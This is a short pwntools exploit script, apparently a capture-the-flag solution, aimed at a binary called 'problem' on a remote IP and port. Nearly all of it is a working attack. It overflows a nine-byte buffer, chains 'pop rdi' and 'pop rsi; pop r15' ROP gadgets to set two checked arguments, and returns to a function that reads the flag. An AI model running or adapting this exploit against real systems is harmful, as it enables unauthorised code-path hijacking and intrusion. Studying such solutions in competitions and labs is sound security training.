from pwn import *
from struct import pack

exe = ELF("./problem",checksec=False)
context.log_level = "WARNING"
context.binary = exe
context.terminal = ["konsole", "-e"]
exeROP = ROP(exe)

def gdbdebug(proc):
    script = """
finish
finish
finish
finish
finish
"""
    gdb.attach(p, gdbscript=script)

# p = process()
p = remote("103.185.38.238", 18086)
# gdbdebug(p)
payload = b''
payload += b"A"*9 # fill the buffer
payload += pack("<Q", exeROP.find_gadget(["pop rdi", "ret"])[0]) # set argument 1
payload += pack("<Q", 0x1) # bypass if 1
payload += pack("<Q", exeROP.find_gadget(["pop rsi", "pop r15", "ret"])[0]) # set argument 2
payload += pack("<Q", 0x600952) # bypass if 2 with Hewhewbr 
payload += b"A"*8 # pad for pop r15
payload += pack("<Q", 0x4007B6) # return to function that read the flag
p.sendlineafter(b"Enter input\n", payload)
p.interactive()
